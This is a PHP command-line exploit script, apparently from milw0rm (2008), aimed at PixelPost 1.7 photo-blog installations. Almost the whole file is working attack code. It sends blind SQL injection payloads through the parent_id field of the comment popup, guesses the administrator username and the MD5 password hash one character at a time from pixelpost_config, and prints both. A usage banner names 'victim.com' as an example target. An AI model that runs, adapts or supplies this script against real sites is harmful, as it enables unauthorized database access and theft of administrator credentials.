#!/usr/bin/php -q -d short_open_tag=on
<?php

// magic_quotes_gpc needs to be off

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

if ($argc<3) {
print "-------------------------------------------------------------------------\r\n";
print "               PixelPost 1.7 Blind SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_pixelpost.php [HOST] [PATH]\r\n\r\n";
print "[HOST] 	  = Target server's hostname or ip address\r\n";
print "[PATH] 	  = Path where PixelPost is located\r\n\r\n";
print "e.g. w4ck1ng_pixelpost.php victim.com /pixelpost/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
die;
}

//Props to rgod for the following functions

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host = $argv[1];
$path = $argv[2];
$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$j=1;$admin="";

while (!strstr($admin,chr(0))){
 for ($i=0; $i<=255; $i++){
   $sql="999' UNION SELECT IF((ASCII(SUBSTRING(admin,".$j.",1)) = ".$i."),'F','U') FROM pixelpost_config WHERE id=1/*";

   $data ="parent_id=" . $sql;

   $packet ="POST ".$p."index.php?showimage=1&popup=comment HTTP/1.0\r\n";
   $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
   $packet.="Host: ".$host."\r\n";
   $packet.="Connection: Close\r\n";
   $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
   $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
   $packet.=$data;

   sendpacketii($packet);

   if (eregi("Die",$html)) {$admin.=chr($i);echo "Username = ".$admin."\r\n";sleep(2);break;} 
   if ($i==255) {die("Exploit failed...");}
 }
$j++;
}

$md5s[0]=0;
$md5s=array_merge($md5s,range(48,57));
$md5s=array_merge($md5s,range(97,102));

$j=1;$password="";

while (!strstr($password,chr(0))){
 for ($i=0; $i<=255; $i++){
  if (in_array($i,$md5s)){
  $sql="999' UNION SELECT IF((ASCII(SUBSTRING(password,".$j.",1)) = ".$i."),'F','U') FROM pixelpost_config WHERE id=1/*";

  $data ="parent_id=" . $sql;

  $packet ="POST ".$p."index.php?showimage=1&popup=comment HTTP/1.0\r\n";
  $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Connection: Close\r\n";
  $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
  $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
  $packet.=$data;

  sendpacketii($packet);

  if (eregi("Die",$html)) {$password.=chr($i);echo "Password = ".$password."\r\n";sleep(2);break;}
  }
  if ($i==255) {die("Exploit failed...");}
 }
$j++;
}

print "-------------------------------------------------------------------------\r\n";
print "               PixelPost 1.7 Blind SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Username          = ".$admin."\r\n";
print "Hash              = ".$password."\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";

?>

# milw0rm.com [2008-01-16]
